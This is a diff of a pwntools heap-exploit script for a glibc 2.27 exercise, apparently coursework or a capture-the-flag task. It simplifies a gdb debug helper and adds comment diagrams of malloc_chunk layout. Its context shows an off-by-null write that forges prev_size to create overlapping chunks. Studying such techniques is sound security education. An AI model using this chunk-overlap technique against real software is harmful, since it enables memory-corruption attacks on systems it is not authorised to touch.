@@ -17,15 +17,8 @@ uu64    = lambda data               :u64(data.ljust(8, '\0'))
 lg = lambda name,data : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
 
 def debug(breakpoint=''):
-    glibc_dir = '~/Exps/Glibc/glibc-2.27/'
-    gdbscript = 'directory %smalloc/\n' % glibc_dir
-    gdbscript += 'directory %sstdio-common/\n' % glibc_dir
-    gdbscript += 'directory %sstdlib/\n' % glibc_dir
-    gdbscript += 'directory %slibio/\n' % glibc_dir
-    gdbscript += 'directory %self/\n' % glibc_dir
-    gdbscript += 'set debug-file-directory /root/comp3633/tcache/debug'
     elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
-    gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
+    gdbscript = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
     gdb.attach(p, gdbscript)
     time.sleep(1)
 
@@ -80,6 +73,33 @@ free(0)
 
 ## Modify the pre_size field of chunk_2 to be 0x640 (chunk_0), and off_by_null will modify the pre_in_used bit to zero
 read(1, "a" * 0x20 + p64(0x640))
+
+
+# struct malloc_chunk {
+
+#   INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */
+#   INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */
+
+#   struct malloc_chunk* fd;         /* double links -- used only if free. */
+#   struct malloc_chunk* bk;
+
+#   /* Only used for large blocks: pointer to next larger size.  */
+#   struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
+#   struct malloc_chunk* bk_nextsize;
+# };
+
+# [chunk_1]
+# {
+    #0   INTERNAL_SIZE_T      prev_size;
+    #8   INTERNAL_SIZE_T      size;
+    #0x10   data                                [chunk_2]
+    #0x18   data                                {
+    #0x20   data         ***[Overlapped]***         #   INTERNAL_SIZE_T      prev_size;
+# }                                                 #   INTERNAL_SIZE_T      size;
+                                                    #   struct malloc_chunk* fd;
+                                                    #   struct malloc_chunk* bk;
+#                                               }  
+
 
 
 ## Now free chunk_2, it would be merged with chunk_0 and chunk_1, then inserted into unsorted bin
